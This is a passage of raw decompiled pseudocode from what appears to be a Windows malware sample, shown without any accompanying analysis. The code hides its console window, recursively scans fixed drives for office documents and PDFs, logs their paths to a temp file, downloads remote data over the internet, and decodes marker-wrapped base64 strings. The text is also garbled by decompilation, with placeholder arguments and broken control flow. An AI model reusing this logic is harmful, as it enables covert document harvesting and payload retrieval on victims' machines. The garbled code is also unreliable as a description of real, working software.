    int32_t v58 = *(int32_t *)((v55 / 64 & 1020) + v12); // 0x406d87
    int32_t v59 = *(int32_t *)((4 * v55 & 1020) + v14); // 0x406d91
    uint32_t v60 = v57 ^ v50 ^ (v58 ^ v56 + *(int32_t *)((v55 / 0x4000 & 1020) + v7)) + v59; // 0x406d9b
    int32_t v61 = *(int32_t *)(4 * v60 / 0x1000000 + v9); // 0x406db2
    int32_t v62 = *(int32_t *)((v60 / 64 & 1020) + v12); // 0x406dc1
    int32_t v63 = *(int32_t *)((4 * v60 & 1020) + v14); // 0x406dcb
    int32_t v64 = *(int32_t *)(a1 + 28); // 0x406dd4
    uint32_t v65 = (v61 + *(int32_t *)((v60 / 0x4000 & 1020) + v7) ^ v62) + v63 ^ v55 ^ v64; // 0x406dd7
    int32_t v66 = *(int32_t *)(4 * v65 / 0x1000000 + v9); // 0x406def
    int32_t v67 = *(int32_t *)(a1 + 24); // 0x406df6
    int32_t v68 = *(int32_t *)((v65 / 64 & 1020) + v12); // 0x406dfc
    int32_t v69 = *(int32_t *)((4 * v65 & 1020) + v14); // 0x406e06
    uint32_t v70 = v67 ^ v60 ^ (v68 ^ v66 + *(int32_t *)((v65 / 0x4000 & 1020) + v7)) + v69; // 0x406e10
    int32_t v71 = *(int32_t *)(4 * v70 / 0x1000000 + v9); // 0x406e27
    int32_t v72 = *(int32_t *)((v70 / 64 & 1020) + v12); // 0x406e36
    int32_t v73 = *(int32_t *)((4 * v70 & 1020) + v14); // 0x406e40
    int32_t v74 = *(int32_t *)(a1 + 20); // 0x406e49
    uint32_t v75 = (v71 + *(int32_t *)((v70 / 0x4000 & 1020) + v7) ^ v72) + v73 ^ v65 ^ v74; // 0x406e4c
    int32_t v76 = *(int32_t *)(4 * v75 / 0x1000000 + v9); // 0x406e64
    int32_t v77 = *(int32_t *)(a1 + 16); // 0x406e68
    int32_t v78 = *(int32_t *)((v75 / 64 & 1020) + v12); // 0x406e71
    int32_t v79 = *(int32_t *)((4 * v75 & 1020) + v14); // 0x406e7b
    uint32_t v80 = v77 ^ v70 ^ (v78 ^ v76 + *(int32_t *)((v75 / 0x4000 & 1020) + v7)) + v79; // 0x406e85
    int32_t v81 = *(int32_t *)(4 * v80 / 0x1000000 + v9); // 0x406e9c
    int32_t v82 = *(int32_t *)((v80 / 64 & 1020) + v12); // 0x406eab
    int32_t v83 = *(int32_t *)((4 * v80 & 1020) + v14); // 0x406eb5
    int32_t v84 = *(int32_t *)(a1 + 12); // 0x406ebe
    uint32_t v85 = (v81 + *(int32_t *)((v80 / 0x4000 & 1020) + v7) ^ v82) + v83 ^ v75 ^ v84; // 0x406ec1
    int32_t v86 = *(int32_t *)((v85 / 0x4000 & 1020) + v7); // 0x406ed3
    int32_t v87 = *(int32_t *)(4 * v85 / 0x1000000 + v9); // 0x406edc
    int32_t v88 = *(int32_t *)(a1 + 8); // 0x406ef0
    int32_t v89 = *(int32_t *)((4 * v85 & 1020) + v14); // 0x406ef3
    uint32_t v90 = v88 ^ v80 ^ v89 + (v87 + v86 ^ *(int32_t *)((v85 / 64 & 1020) + v12)); // 0x406efd
    int32_t v91 = *(int32_t *)((v90 / 0x4000 & 1020) + v7); // 0x406f0c
    int32_t v92 = *(int32_t *)(4 * v90 / 0x1000000 + v9); // 0x406f15
    int32_t v93 = *(int32_t *)((v90 / 64 & 1020) + v12); // 0x406f22
    uint32_t v94 = *(int32_t *)a1 ^ v90; // 0x406f2c
    int32_t v95 = *(int32_t *)(a1 + 4); // 0x406f37
    uint32_t v96 = v95 ^ v85 ^ *(int32_t *)((4 * v90 & 1020) + v14) + (v92 + v91 ^ v93); // 0x406f3a
    int32_t v97; // 0x406b40
    *(char *)v97 = (char)(v94 / 0x1000000);
    *(char *)(v97 + 1) = (char)(v94 / 0x10000);
    *(char *)(v97 + 2) = (char)(v94 / 256);
    *(char *)(v97 + 4) = (char)(v96 / 0x1000000);
    *(char *)(v97 + 5) = (char)(v96 / 0x10000);
    uint32_t result = v96 / 256; // 0x406f65
    *(char *)(v97 + 3) = (char)v94;
    *(char *)(v97 + 6) = (char)result;
    *(char *)(v97 + 7) = (char)v96;
    return result;
}

// Address range: 0x406f80 - 0x407126
int32_t function_406f80(void) {
    // 0x406f80
    int32_t v1; // 0x406f80
    __asm_movups_9(*(int128_t *)&v1, __asm_movups(0x370734413198a2e85a308d3243f6a88));
    int32_t v2; // 0x406f80
    __asm_movups_9(*(int128_t *)(v2 + 16), __asm_movups(g4));
    __asm_movups_9(*(int128_t *)(v2 + 32), __asm_movups(g5));
    __asm_movups_9(*(int128_t *)(v2 + 48), __asm_movups(g6));
    __asm_movq_8(*(int64_t *)(v2 + 64), __asm_movq(-0x768604e46de92a27));
    _memcpy();
    int32_t v3 = 0; // 0x406fff
    int32_t v4 = 2; // 0x406fff
    int32_t v5 = v4 - 2; // 0x407000
    int32_t v6 = v4 - 1; // 0x407006
    int32_t v7; // 0x406f80
    unsigned char v8 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v5 >> 31) | (int64_t)v5) % 24)); // 0x407009
    unsigned char v9 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v6 >> 31) | (int64_t)v6) % 24)); // 0x407014
    unsigned char v10 = *(char *)(v4 % 24 + v7); // 0x407023
    unsigned char v11 = *(char *)((v4 | 1) % 24 + v7); // 0x407036
    int32_t * v12 = (int32_t *)(4 * v3 + v2); // 0x40703f
    int32_t v13 = *v12; // 0x40703f
    *v12 = (256 * (256 * (256 * (int32_t)v8 | (int32_t)v9) | (int32_t)v10) | (int32_t)v11) ^ v13;
    v3++;
    v4 += 4;
    while (v3 != 18) {
        // 0x407000
        v5 = v4 - 2;
        v6 = v4 - 1;
        v8 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v5 >> 31) | (int64_t)v5) % 24));
        v9 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v6 >> 31) | (int64_t)v6) % 24));
        v10 = *(char *)(v4 % 24 + v7);
        v11 = *(char *)((v4 | 1) % 24 + v7);
        v12 = (int32_t *)(4 * v3 + v2);
        v13 = *v12;
        *v12 = (256 * (256 * (256 * (int32_t)v8 | (int32_t)v9) | (int32_t)v10) | (int32_t)v11) ^ v13;
        v3++;
        v4 += 4;
    }
    // 0x407052
    unsigned char v14; // 0x406f80
    unsigned char v15; // 0x406f80
    int32_t v16 = 256 * (int32_t)v15 | (int32_t)v14;
    unsigned char v17; // 0x406f80
    unsigned char v18; // 0x406f80
    int32_t v19 = 256 * (0x10000 * (int32_t)v18 | (int32_t)v17);
    for (int32_t i = 0; i < 18; i += 2) {
        // 0x407052
        function_406700((int32_t)&g36);
        int32_t v20 = 4 * i + v2;
        *(int32_t *)v20 = v16;
        *(int32_t *)(v20 + 4) = v19;
    }
    int32_t v21 = v2 + 76; // 0x4070b0
    for (int32_t i = 4; i > 0; i--) {
        int32_t v22 = 128; // 0x4070bc
        function_406700((int32_t)&g36);
        *(int32_t *)(v21 - 4) = v16;
        *(int32_t *)v21 = v19;
        v21 += 8;
        v22--;
        int32_t v23 = v21; // 0x407117
        while (v22 != 0) {
            // 0x4070c0
            function_406700((int32_t)&g36);
            *(int32_t *)(v23 - 4) = v16;
            *(int32_t *)v23 = v19;
            v21 = v23 + 8;
            v22--;
            v23 = v21;
        }
    }
    // 0x40711f
    return 0;
}

// Address range: 0x407180 - 0x40719c
int main(int argc, char ** argv) {
    // 0x407180
    ShowWindow(GetConsoleWindow(), (int32_t)&g36);
    function_40aa10((int32_t)&g36);
    return 0;
}

// Address range: 0x4071a0 - 0x407202
int32_t function_4071a0(void) {
    // 0x4071a0
    int32_t v1; // 0x4071a0
    int32_t v2 = *(int32_t *)(v1 + 120 + *(int32_t *)(v1 + 60)) + v1; // 0x4071b5
    int32_t v3 = *(int32_t *)(v2 + 32); // 0x4071ba
    int32_t v4 = *(int32_t *)(v2 + 24) - 1; // 0x4071c2
    int32_t v5 = -1; // 0x4071c5
    if (v4 >= 0) {
        // 0x4071c7
        int32_t v6; // bp-24, 0x4071a0
        int32_t v7 = &v6; // 0x4071cd
        int32_t v8 = v4; // 0x4071d8
        v7 -= 8;
        *(int32_t *)v7 = *(int32_t *)(v3 + v1 + 4 * v8) + v1;
        int32_t v9 = lstrcmpA((char *)&g36, (char *)&g36); // 0x4071ce
        v5 = v8;
        while (v9 != 0) {
            // 0x4071d8
            v8--;
            v5 = -1;
            if (v8 < 0) {
                // break -> 0x4071e3
                break;
            }
            v7 -= 8;
            *(int32_t *)v7 = *(int32_t *)(v3 + v1 + 4 * v8) + v1;
            v9 = lstrcmpA((char *)&g36, (char *)&g36);
            v5 = v8;
        }
    }
    uint16_t v10 = *(int16_t *)(2 * v5 + v1 + *(int32_t *)(v2 + 36)); // 0x4071ec
    int32_t v11 = *(int32_t *)(*(int32_t *)(v2 + 28) + v1 + 4 * (int32_t)v10); // 0x4071f6
    return v11 + v1;
}

// Address range: 0x408f50 - 0x4091dc
int32_t function_408f50(void) {
    // 0x408f50
    __chkstk();
    int32_t lpOut; // 0x408f50
    wsprintfW((int16_t *)lpOut, (int16_t *)&g36);
    int32_t lpFileName; // bp-4108, 0x408f50
    int16_t * v1 = (int16_t *)&lpFileName; // bp-24, 0x408f97
    char lpFindFileData; // bp-8796, 0x408f50
    int32_t * v2 = FindFirstFileW((int16_t *)&lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x408f98
    if (v2 == (int32_t *)-1) {
        // 0x408fa9
        return _40___security_check_cookie_40_4();
    }
    int32_t v3 = (int32_t)v2; // 0x408f98
    int32_t v4; // bp-8752, 0x408f50
    int32_t v5 = &v4; // 0x408fdb
    int32_t v6 = &lpFileName;
    int32_t v7; // bp-8760, 0x408f50
    int32_t v8 = &v7;
    int32_t v9; // bp-8204, 0x408f50
    int32_t v10 = &v9;
    int32_t v11 = (int32_t)&v1; // 0x4091a9
    int32_t v12; // 0x408f50
    int32_t v13; // 0x408f50
    while (true) {
      lab_0x408fd0:;
        int32_t v14 = v11;
        *(int32_t *)(v14 - 4) = (int32_t)&g3;
        int32_t v15 = v14 - 8; // 0x408fdb
        *(int32_t *)v15 = v5;
        int32_t v16 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x408fdc
        v13 = v15;
        if (v16 == 0) {
            goto lab_0x4091a2;
        } else {
            // 0x408fe6
            *(int32_t *)(v14 - 12) = (int32_t)L"..";
            int32_t v17 = v14 - 16; // 0x408ff1
            *(int32_t *)v17 = v5;
            int32_t v18 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x408ff2
            v13 = v17;
            if (v18 == 0) {
                goto lab_0x4091a2;
            } else {
                int32_t * v19 = (int32_t *)(v14 - 20); // 0x409002
                *v19 = v5;
                int32_t v20 = v14 - 28; // 0x40900f
                int32_t * v21 = (int32_t *)v20; // 0x40900f
                *v21 = (int32_t)L"%s\\%s";
                int32_t * v22 = (int32_t *)(v14 - 32); // 0x409014
                *v22 = v6;
                wsprintfW((int16_t *)&g36, (int16_t *)&g36);
                if ((lpFindFileData & 16) == 0) {
                    // 0x409033
                    *v19 = (int32_t)L".txt";
                    *(int32_t *)(v14 - 24) = v5;
                    *v21 = 2 * lstrlenW((int16_t *)&g36) + v8;
                    int32_t v23 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x40904b
                    v12 = v20;
                    if (v23 == 0) {
                        goto lab_0x409151;
                    } else {
                        // 0x409055
                        *v22 = (int32_t)L".doc";
                        *(int32_t *)(v14 - 36) = v5;
                        int32_t v24 = lstrlenW((int16_t *)&g36); // 0x409061
                        int32_t v25 = v14 - 40; // 0x40906c
                        *(int32_t *)v25 = 2 * v24 + v8;
                        int32_t v26 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x40906d
                        v12 = v25;
                        if (v26 == 0) {
                            goto lab_0x409151;
                        } else {
                            // 0x409077
                            *(int32_t *)(v14 - 44) = (int32_t)L".xls";
                            *(int32_t *)(v14 - 48) = v5;
                            int32_t v27 = lstrlenW((int16_t *)&g36); // 0x409083
                            int32_t v28 = v14 - 52; // 0x40908e
                            *(int32_t *)v28 = 2 * v27 + v8;
                            int32_t v29 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x40908f
                            v12 = v28;
                            if (v29 == 0) {
                                goto lab_0x409151;
                            } else {
                                // 0x409099
                                *(int32_t *)(v14 - 56) = (int32_t)L".xlsx";
                                *(int32_t *)(v14 - 60) = v5;
                                int32_t v30 = lstrlenW((int16_t *)&g36); // 0x4090a5
                                int32_t v31 = v14 - 64; // 0x4090b0
                                *(int32_t *)v31 = 2 * v30 + v8;
                                int32_t v32 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x4090b1
                                v12 = v31;
                                if (v32 == 0) {
                                    goto lab_0x409151;
                                } else {
                                    // 0x4090bb
                                    *(int32_t *)(v14 - 68) = (int32_t)L".docx";
                                    *(int32_t *)(v14 - 72) = v5;
                                    int32_t v33 = lstrlenW((int16_t *)&g36); // 0x4090c7
                                    int32_t v34 = v14 - 76; // 0x4090d2
                                    int32_t v35; // bp-8762, 0x408f50
                                    *(int32_t *)v34 = 2 * v33 + (int32_t)&v35;
                                    int32_t v36 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x4090d3
                                    v12 = v34;
                                    if (v36 == 0) {
                                        goto lab_0x409151;
                                    } else {
                                        // 0x4090d9
                                        *(int32_t *)(v14 - 80) = (int32_t)L".xls";
                                        *(int32_t *)(v14 - 84) = v5;
                                        int32_t v37 = lstrlenW((int16_t *)&g36); // 0x4090e5
                                        int32_t v38 = v14 - 88; // 0x4090f0
                                        *(int32_t *)v38 = 2 * v37 + v8;
                                        int32_t v39 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x4090f1
                                        v12 = v38;
                                        if (v39 == 0) {
                                            goto lab_0x409151;
                                        } else {
                                            // 0x4090f7
                                            *(int32_t *)(v14 - 92) = (int32_t)L".ppt";
                                            *(int32_t *)(v14 - 96) = v5;
                                            int32_t v40 = lstrlenW((int16_t *)&g36); // 0x409103
                                            int32_t v41 = v14 - 100; // 0x40910e
                                            *(int32_t *)v41 = 2 * v40 + v8;
                                            int32_t v42 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x40910f
                                            v12 = v41;
                                            if (v42 == 0) {
                                                goto lab_0x409151;
                                            } else {
                                                // 0x409115
                                                *(int32_t *)(v14 - 104) = (int32_t)L".pptx";
                                                *(int32_t *)(v14 - 108) = v5;
                                                int32_t v43 = lstrlenW((int16_t *)&g36); // 0x409121
                                                int32_t v44 = v14 - 112; // 0x40912c
                                                *(int32_t *)v44 = 2 * v43 + v8;
                                                int32_t v45 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x40912d
                                                v12 = v44;
                                                if (v45 == 0) {
                                                    goto lab_0x409151;
                                                } else {
                                                    // 0x409133
                                                    *(int32_t *)(v14 - 116) = (int32_t)L".pdf";
                                                    *(int32_t *)(v14 - 120) = v5;
                                                    int32_t v46 = lstrlenW((int16_t *)&g36); // 0x40913f
                                                    int32_t v47 = v14 - 124; // 0x40914a
                                                    *(int32_t *)v47 = 2 * v46 + v8;
                                                    int32_t v48 = lstrcmpW((int16_t *)&g36, (int16_t *)&g36); // 0x40914b
                                                    v12 = v47;
                                                    v13 = v47;
                                                    if (v48 != 0) {
                                                        goto lab_0x4091a2;
                                                    } else {
                                                        goto lab_0x409151;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    // 0x409023
                    function_408f50();
                    v13 = v17;
                    goto lab_0x4091a2;
                }
            }
        }
    }
  lab_0x4091bd:;
    // 0x4091bd
    int32_t v49; // 0x408f50
    *(int32_t *)(v49 - 12) = v3;
    FindClose(&g36);
    return _40___security_check_cookie_40_4();
  lab_0x4091a2:
    // 0x4091a2
    v49 = v13;
    *(int32_t *)(v49 - 4) = (int32_t)&lpFindFileData;
    v11 = v49 - 8;
    *(int32_t *)v11 = v3;
    if (!FindNextFileW(&g36, (struct _WIN32_FIND_DATAW *)&g36)) {
        // break -> 0x4091bd
        goto lab_0x4091bd;
    }
    goto lab_0x408fd0;
  lab_0x409151:;
    int32_t * v50 = (int32_t *)(v12 - 4); // 0x409157
    *v50 = v5;
    int32_t * v51 = (int32_t *)(v12 - 8); // 0x409158
    *v51 = (int32_t)"%s\n";
    function_404410((char *)&g36);
    int32_t * v52 = (int32_t *)(v12 - 12); // 0x409168
    *v52 = v6;
    int32_t * v53 = (int32_t *)(v12 - 16); // 0x40916f
    *v53 = (int32_t)L" \n%s \r\n";
    int32_t * v54 = (int32_t *)(v12 - 20); // 0x409174
    *v54 = v10;
    wsprintfW((int16_t *)&g36, (int16_t *)&g36);
    *v50 = v10;
    int32_t v55 = lstrlenW((int16_t *)&g36); // 0x409181
    *v51 = 0;
    int32_t v56; // bp-8808, 0x408f50
    *v52 = (int32_t)&v56;
    *v53 = 2 * v55;
    *v54 = v10;
    int32_t v57 = v12 - 24; // 0x409196
    *(int32_t *)v57 = g32;
    WriteFile(&g36, &g36, (int32_t)&g36, &g36, (struct _OVERLAPPED *)&g36);
    v13 = v57;
    goto lab_0x4091a2;
}

// Address range: 0x4091e0 - 0x409252
int32_t function_4091e0(void) {
    int32_t v1 = 260; // bp-556, 0x4091fc
    int16_t lpBuffer; // bp-540, 0x4091e0
    GetLogicalDriveStringsW(260, &lpBuffer);
    if (lpBuffer == 0) {
        // 0x409242
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = &v1; // 0x409220
    int32_t v3 = &lpBuffer; // 0x409239
    v2 -= 4;
    *(int32_t *)v2 = v3;
    if (GetDriveTypeW((int16_t *)&g36) == 3) {
        // 0x409228
        function_408f50();
    }
    int32_t v4 = v3;
    int32_t v5 = v4 + 2; // 0x409230
    while (*(int16_t *)v5 != 0) {
        // 0x409230
        v4 = v5;
        v5 = v4 + 2;
    }
    // 0x409239
    v3 = v4 + 4;
    while (*(int16_t *)v3 != 0) {
        // 0x409220
        v2 -= 4;
        *(int32_t *)v2 = v3;
        if (GetDriveTypeW((int16_t *)&g36) == 3) {
            // 0x409228
            function_408f50();
        }
        // 0x409230
        v4 = v3;
        v5 = v4 + 2;
        while (*(int16_t *)v5 != 0) {
            // 0x409230
            v4 = v5;
            v5 = v4 + 2;
        }
        // 0x409239
        v3 = v4 + 4;
    }
    // 0x409242
    return _40___security_check_cookie_40_4();
}

// Address range: 0x409260 - 0x4092f0
int32_t function_409260(void) {
    // 0x409260
    int32_t lpBuffer; // bp-276, 0x409260
    _memset(&lpBuffer, 0, 260);
    GetTempPathA(260, (char *)&lpBuffer);
    lstrcatA((char *)&lpBuffer, "edg499.dat");
    int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, 0, NULL, 2, 128, NULL); // 0x4092c6
    g32 = (int32_t)fileHandle;
    function_4091e0();
    CloseHandle((int32_t *)g32);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x409b80 - 0x409cb7
int32_t function_409b80(void) {
    // 0x409b80
    __chkstk();
    int16_t * v1 = NULL; // bp-10012, 0x409bb1
    int16_t * v2 = NULL; // bp-10024, 0x409bb7
    int32_t * v3 = InternetOpenW(NULL, 0, NULL, (int16_t *)&g36, (int32_t)&g36); // 0x409bbd
    if (v3 == NULL) {
        // 0x409bea
        return _40___security_check_cookie_40_4();
    }
    int32_t v4 = (int32_t)v3; // 0x409bbd
    int32_t v5 = v4; // bp-60, 0x409bd8
    int32_t * v6 = InternetOpenUrlW(v3, (int16_t *)&g36, (int16_t *)&g36, (int32_t)&g36, (int32_t)&g36, (int32_t)&g36); // 0x409bd9
    if (v6 == NULL) {
        // 0x409be3
        InternetCloseHandle(v3);
        // 0x409bea
        return _40___security_check_cookie_40_4();
    }
    int32_t v7 = (int32_t)v6; // 0x409bd9
    int32_t v8; // bp-10008, 0x409b80
    int32_t v9 = &v8; // 0x409c12
    int32_t v10 = 0; // 0x409bff
    int32_t v11 = 0;
    int32_t v12 = &v5;
    *(int32_t *)(v12 - 4) = (int32_t)&v1;
    *(int32_t *)(v12 - 8) = 0x2710;
    *(int32_t *)(v12 - 12) = v9;
    *(int32_t *)(v12 - 16) = v7;
    InternetReadFile(&g36, &g36, (int32_t)&g36, &g36);
    int32_t * v13 = (int32_t *)(v12 - 20); // 0x409c22
    *v13 = v10 + (int32_t)v1;
    int32_t v14 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g36); // 0x409c23
    int32_t * v15 = (int32_t *)(v12 - 24); // 0x409c28
    *v15 = v10;
    int32_t * v16 = (int32_t *)(v12 - 28); // 0x409c29
    *v16 = v11;
    int32_t * v17 = (int32_t *)(v12 - 32); // 0x409c31
    *v17 = v14;
    _memcpy();
    int32_t v18 = v12 - 36; // 0x409c37
    int32_t * v19 = (int32_t *)v18; // 0x409c37
    *v19 = (int32_t)v1;
    int32_t * v20 = (int32_t *)(v12 - 40);
    *v20 = v9;
    int32_t * v21 = (int32_t *)(v12 - 44);
    *v21 = v14 + v10;
    _memcpy();
    *v13 = 0;
    *v15 = (int32_t)&v2;
    *v16 = (int32_t)v1;
    *v17 = v9;
    *v19 = 0;
    WriteFile(&g36, &g36, (int32_t)&g36, &g36, (struct _OVERLAPPED *)&g36);
    *v20 = v11;
    function_40b325();
    v10 += (int32_t)v1;
    while (v1 != NULL) {
        // 0x409c00
        v11 = v14;
        v12 = v18;
        *(int32_t *)(v12 - 4) = (int32_t)&v1;
        *(int32_t *)(v12 - 8) = 0x2710;
        *(int32_t *)(v12 - 12) = v9;
        *(int32_t *)(v12 - 16) = v7;
        InternetReadFile(&g36, &g36, (int32_t)&g36, &g36);
        v13 = (int32_t *)(v12 - 20);
        *v13 = v10 + (int32_t)v1;
        v14 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g36);
        v15 = (int32_t *)(v12 - 24);
        *v15 = v10;
        v16 = (int32_t *)(v12 - 28);
        *v16 = v11;
        v17 = (int32_t *)(v12 - 32);
        *v17 = v14;
        _memcpy();
        v18 = v12 - 36;
        v19 = (int32_t *)v18;
        *v19 = (int32_t)v1;
        v20 = (int32_t *)(v12 - 40);
        *v20 = v9;
        v21 = (int32_t *)(v12 - 44);
        *v21 = v14 + v10;
        _memcpy();
        *v13 = 0;
        *v15 = (int32_t)&v2;
        *v16 = (int32_t)v1;
        *v17 = v9;
        *v19 = 0;
        WriteFile(&g36, &g36, (int32_t)&g36, &g36, (struct _OVERLAPPED *)&g36);
        *v20 = v11;
        function_40b325();
        v10 += (int32_t)v1;
    }
    // 0x409c92
    *v20 = v7;
    InternetCloseHandle((int32_t *)v14);
    *v21 = v4;
    InternetCloseHandle(&g36);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x409cc0 - 0x409d79
int32_t function_409cc0(void) {
    int32_t v1; // 0x409cc0
    int32_t v2 = v1;
    v1 = v2 + 1;
    // 0x409cc0
    while (*(char *)v2 != 0) {
        // 0x409cd1
        v2 = v1;
        v1 = v2 + 1;
    }
    // 0x409cd8
    int32_t v3; // 0x409cc0
    int32_t v4 = v2 - v3; // 0x409cd8
    int32_t result = _malloc(); // 0x409ce9
    _memset((int32_t *)result, 0, (v4 - (v4 >> 31)) / 2);
    if (v4 < 1) {
        // 0x409d67
        return result;
    }
    int32_t v5 = v3 + 1;
    int32_t v6 = 0; // 0x409d5f
    int32_t v7 = 0; // 0x409cc0
    while (true) {
        int32_t v8 = v7;
        int32_t v9 = v6;
        int32_t v10 = v9; // 0x409d0c
        v7 = v8;
        if (*(char *)(v9 + v3) == 91) {
            // 0x409d0e
            v10 = v9;
            v7 = v8;
            if (*(char *)(v9 + v5) == 91) {
                int32_t v11 = v9 + 2; // 0x409d15
                int32_t v12 = v11; // 0x409d1c
                int32_t v13 = 0; // 0x409d1c
                int32_t v14 = v8; // 0x409d1c
                v10 = v9;
                v7 = v8;
                if (v11 < v4) {
                    int32_t v15; // 0x409cc0
                    int32_t v16; // 0x409cc0
                    while (true) {
                        // 0x409d20
                        v16 = v14;
                        int32_t v17 = v13;
                        v15 = v12;
                        char v18 = *(char *)(v15 + v3); // 0x409d20
                        if (v18 == 93) {
                            // 0x409d28
                            if (*(char *)(v15 + v5) == v18) {
                                // break -> 0x409d71
                                break;
                            }
                        }
                        int32_t v19 = v17 + 1; // 0x409d2e
                        int32_t v20 = v16; // 0x409d31
                        if (v19 >= 1) {
                            uint64_t v21 = 0x55555556 * (int64_t)v19; // 0x409d38
                            v20 = v16;
                            if (v19 == 3 * ((int32_t)(v21 / 0x8000000000000000) + (int32_t)(v21 / 0x100000000))) {
                                // 0x409d4d
                                *(char *)(v16 + result) = v18;
                                v20 = v16 + 1;
                            }
                        }
                        int32_t v22 = v15 + 1; // 0x409d57
                        v12 = v22;
                        v13 = v19;
                        v14 = v20;
                        v10 = v9;
                        v7 = v20;
                        if (v22 >= v4) {
                            goto lab_0x409d5f;
                        }
                    }
                    // 0x409d71
                    v10 = v15 + 1;
                    v7 = v16;
                }
            }
        }
      lab_0x409d5f:
        // 0x409d5f
        v6 = v10 + 1;
        if (v6 >= v4) {
            // break -> 0x409d67
            break;
        }
    }
    // 0x409d67
    return result;
}

// Address range: 0x409d80 - 0x409f7a
int32_t function_409d80(void) {
    // 0x409d80
    int32_t v1; // 0x409d80
    if (v1 == 0 || (char)v1 == 0) {
        // 0x409f73
        return 0;
    }
    char * lpString = (char *)v1; // 0x409da3
    int32_t * memoryHandle = LocalAlloc(64, lstrlenA(lpString) + 1); // 0x409db1
    int32_t v2 = (int32_t)memoryHandle; // 0x409db1
    char v3 = *lpString; // 0x409df8
    int32_t v4 = 0;
    int32_t v5; // 0x409d80
    while (true) {
      lab_0x409dc4:;
        int32_t v6 = v4;
        char v7 = v3; // 0x409dc4
        if ((v7 & -33) < 91) {
            // 0x409df3
            *(char *)(v6 + v2) = v7;
            v5 = v6 + 1;
            goto lab_0x409df7;
        } else {
            // 0x409dda
            v5 = v6;
            if (v7 != 61 == v7 > 57 == ((v7 || 4) != 47)) {
                goto lab_0x409df7;
            } else {
                // 0x409df3
                *(char *)(v6 + v2) = v7;
                v5 = v6 + 1;
                goto lab_0x409df7;
            }
        }
    }
  lab_0x409e00:;
    int32_t v8; // 0x409d80
    if (v4 < 1) {
        // 0x409f60
        LocalFree(memoryHandle);
        int32_t v9; // 0x409d80
        return v9 - v8;
    }
    char * v10 = (char *)v8; // 0x409d80
    int32_t v11 = 0;
    char v12 = *(char *)(v11 + v2); // 0x409e10
    int32_t v13 = v11 | 1; // 0x409e13
    int32_t v14; // 0x409d80
    int32_t v15 = v14 & -0x10000; // 0x409e16
    int32_t v16 = v15 | 0x4141; // 0x409e1e
    if (v13 < v4) {
        // 0x409e20
        v16 = v15 | (int32_t)*(char *)(v13 + v2) | 0x4100;
    }
    int32_t v17 = v16; // 0x409e2e
    int32_t v18 = v17; // 0x409e29
    if (v13 + 1 < v4) {
        // 0x409e2b
        v18 = 256 * (int32_t)*(char *)((v11 | 2) + v2) | v17 & -0xff01;
    }
    int32_t v19 = v18;
    int32_t v20 = v11 | 3; // 0x409e32
    int32_t v21 = 0x4100; // 0x409e37
    if (v20 < v4) {
        // 0x409e39
        v21 = 256 * (int32_t)*(char *)(v20 + v2);
    }
    uint32_t v22 = v21;
    unsigned char v23 = v12 - 65; // 0x409e42
    int32_t v24; // 0x409d80
    if (v23 < 26) {
        // 0x409e48
        v24 = v23;
    } else {
        if (v12 < 123) {
            // 0x409e55
            v24 = v12 - 71;
        } else {
            if (v12 < 58) {
                // 0x409e62
                v24 = v12 + 4;
            } else {
                // 0x409e67
                v24 = v12 != 43 ? 63 : 62;
            }
        }
    }
    char v25 = v19;
    int32_t v26; // 0x409d80
    int32_t v27; // 0x409e78
    int32_t v28; // 0x409e85
    int32_t v29; // 0x409e92
    int32_t v30; // 0x409e9d
    if (v25 < 91) {
        // 0x409e78
        v27 = v19 + 191 & 255 | v19 & -256;
        v14 = v27;
        v26 = v27;
    } else {
        if (v25 < 123) {
            // 0x409e85
            v28 = v19 + 185 & 255 | v19 & -256;
            v14 = v28;
            v26 = v28;
        } else {
            if (v25 < 58) {
                // 0x409e92
                v29 = v19 + 4 & 255 | v19 & -256;
                v14 = v29;
                v26 = v29;
            } else {
                // 0x409e97
                v30 = (v25 != 43 ? 63 : 62) | v19 & -256;
                v14 = v30;
                v26 = v30;
            }
        }
    }
    uint32_t v31 = v26 / 256; // 0x409ea0
    char v32 = v31;
    int32_t v33; // 0x409d80
    if (v32 < 91) {
        // 0x409ea8
        v33 = v31 + 191 & 255;
    } else {
        if (v32 < 123) {
            // 0x409eb7
            v33 = v31 + 185 & 255;
        } else {
            if (v32 < 58) {
                // 0x409ec6
                v33 = v31 + 4 & 255;
            } else {
                // 0x409ecd
                v33 = v32 != 43 ? 63 : 62;
            }
        }
    }
    int32_t v34 = v24 | v22;
    uint32_t v35 = v33;
    char v36 = v22 / 256;
    int32_t v37; // 0x409d80
    if (v36 < 91) {
        // 0x409ede
        v37 = v34 + 0xbf00 & 0xff00;
    } else {
        if (v36 < 123) {
            // 0x409eed
            v37 = v34 + 0xb900 & 0xff00;
        } else {
            if (v36 < 58) {
                // 0x409efc
                v37 = v34 + 1024 & 0xff00;
            } else {
                // 0x409f03
                v37 = 256 * (int32_t)((v22 & 0xff00) != 0x2b00) | 0x3e00;
            }
        }
    }
    int32_t v38 = v37;
    int32_t v39 = (int32_t)v10; // 0x409f0c
    int32_t v40 = v26 / 16 & 15 | 4 * v34 & 252; // 0x409f17
    *v10 = (char)v40;
    int32_t v41 = v39 + 1; // 0x409f1b
    char * v42 = (char *)v41; // 0x409f1c
    int32_t v43 = v14; // 0x409f22
